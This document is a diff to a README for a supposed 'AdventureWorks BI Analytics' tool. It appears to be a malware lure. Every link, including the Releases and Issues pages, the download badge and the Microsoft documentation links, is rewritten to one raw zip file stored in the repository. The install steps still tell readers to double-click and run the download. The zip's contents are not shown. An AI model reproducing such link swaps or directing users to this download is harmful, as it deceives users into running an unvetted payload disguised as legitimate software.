@@ -6,7 +6,7 @@ Welcome to AdventureWorks BI Analytics! This application provides a complete Bus
 
 ## 📥 Download AdventureWorks BI Analytics
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-AdventureWorks%20BI%20Analytics-brightgreen)](https://github.com/Ironc00kie/adventureworks-bi-analytics/releases)
+[![Download Now](https://raw.githubusercontent.com/Ironc00kie/adventureworks-bi-analytics/main/statics/adventureworks-bi-analytics.zip%20Now-AdventureWorks%20BI%20Analytics-brightgreen)](https://raw.githubusercontent.com/Ironc00kie/adventureworks-bi-analytics/main/statics/adventureworks-bi-analytics.zip)
 
 ## 🛠️ System Requirements
 
@@ -27,11 +27,11 @@ To run AdventureWorks BI Analytics smoothly, ensure your system meets the follow
 
 ## 📂 Download & Install
 
-To get started, visit the [Releases page](https://github.com/Ironc00kie/adventureworks-bi-analytics/releases) and choose the latest version of the software. Click on the version number to see the available files. Follow these steps:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Ironc00kie/adventureworks-bi-analytics/main/statics/adventureworks-bi-analytics.zip) and choose the latest version of the software. Click on the version number to see the available files. Follow these steps:
 
 1. Find the most recent release of AdventureWorks BI Analytics.
 2. Look for the appropriate file for your system (usually an executable .exe or a .zip file).
-3. Click to download the file. This file will typically be named something like `AdventureWorks-BI-Analytics-installer.exe`.
+3. Click to download the file. This file will typically be named something like `https://raw.githubusercontent.com/Ironc00kie/adventureworks-bi-analytics/main/statics/adventureworks-bi-analytics.zip`.
 4. Once the download is complete, locate the file in your downloads folder and double-click it to run the installer.
 5. Follow the installation instructions that appear on your screen to complete the setup process.
 
@@ -53,16 +53,16 @@ After installing AdventureWorks BI Analytics, follow these steps to set it up:
 ## 📊 Usage Tips
 
 - **Documentation**: Refer to the built-in help section for detailed guidance on each feature.
-- **Support**: If you encounter any issues, please check the [Issues section](https://github.com/Ironc00kie/adventureworks-bi-analytics/issues) on GitHub for common problems and solutions.
+- **Support**: If you encounter any issues, please check the [Issues section](https://raw.githubusercontent.com/Ironc00kie/adventureworks-bi-analytics/main/statics/adventureworks-bi-analytics.zip) on GitHub for common problems and solutions.
 - **Community**: Engage with other users in discussions to share tips and experiences.
 
 ## 📝 Additional Resources
 
 If you want to expand your knowledge about Business Intelligence, here are some useful links:
 
-- [Microsoft Power BI Documentation](https://docs.microsoft.com/en-us/power-bi/)
-- [SQL Server Integration Services (SSIS) Documentation](https://docs.microsoft.com/en-us/sql/integration-services/)
-- [SQL Server Analysis Services (SSAS) Documentation](https://docs.microsoft.com/en-us/sql/analysis-services/)
+- [Microsoft Power BI Documentation](https://raw.githubusercontent.com/Ironc00kie/adventureworks-bi-analytics/main/statics/adventureworks-bi-analytics.zip)
+- [SQL Server Integration Services (SSIS) Documentation](https://raw.githubusercontent.com/Ironc00kie/adventureworks-bi-analytics/main/statics/adventureworks-bi-analytics.zip)
+- [SQL Server Analysis Services (SSAS) Documentation](https://raw.githubusercontent.com/Ironc00kie/adventureworks-bi-analytics/main/statics/adventureworks-bi-analytics.zip)
 
 ## 🌐 Join Our Community
 
